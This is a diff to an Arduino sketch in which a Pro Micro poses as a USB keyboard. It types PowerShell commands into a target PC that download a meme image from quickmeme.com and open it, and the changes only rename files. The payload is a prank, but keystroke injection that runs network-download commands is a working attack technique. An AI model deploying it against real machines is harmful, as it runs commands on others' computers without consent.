@@ -35,17 +35,17 @@ void loop()
 
     Serial.println("Download image");
     // The pro micro seems to appear as a US keyboard and so @ = " and vice-versa
-    //Keyboard.println("powershell -command @& { iwr http://www.quickmeme.com/img/e0/e08438c84e36715ed30df393db08392ab9deefd0b7fb1d9ebaade9e549b18314.jpg -OutFile 'Desktop/image.bmp' }@");
+    //Keyboard.println("powershell -command @& { iwr http://www.quickmeme.com/img/e0/e08438c84e36715ed30df393db08392ab9deefd0b7fb1d9ebaade9e549b18314.jpg -OutFile 'Desktop/image.jpg' }@");
     
     // iwr wasn't introduced until Powershell v3.0 (my targets have v2.0) so use the old New-Object method to download the image:
     Keyboard.println("powershell");
     Keyboard.println("$WebClient = New-Object System.Net.WebClient");
-    Keyboard.println("$WebClient.DownloadFile('http://www.quickmeme.com/img/e0/e08438c84e36715ed30df393db08392ab9deefd0b7fb1d9ebaade9e549b18314.jpg','Desktop/01.jpg')");
+    Keyboard.println("$WebClient.DownloadFile('http://www.quickmeme.com/img/e0/e08438c84e36715ed30df393db08392ab9deefd0b7fb1d9ebaade9e549b18314.jpg','Desktop/image.jpg')");
     
     delay(1000); // Wait for download to complete
     
     Serial.println("Open image");
-    Keyboard.println("Desktop/image.bmp");
+    Keyboard.println("Desktop/image.jpg");
 
     delay(500); // Wait for default image viewer to launch
 
